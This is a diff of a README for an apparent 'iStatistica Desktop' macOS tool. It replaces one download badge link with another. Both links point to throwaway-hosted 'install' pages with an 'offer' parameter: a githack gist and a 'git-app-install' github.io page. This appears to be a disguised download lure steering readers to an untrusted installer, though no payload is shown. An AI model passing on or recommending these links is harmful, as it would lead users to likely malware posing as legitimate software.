@@ -1,6 +1,6 @@
 # iStatistica Desktop — system analytics macOS tool
 
-<a href="https://gistcdn.githack.com/nibswitok301/ed94bb6af2b9971ce9f6087a90e8f5d1/raw/db70a9d445c1084290fceb676f4fe013553e7928/install.html?offer=iStatistica" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=iStatistica" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20iStatistica%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
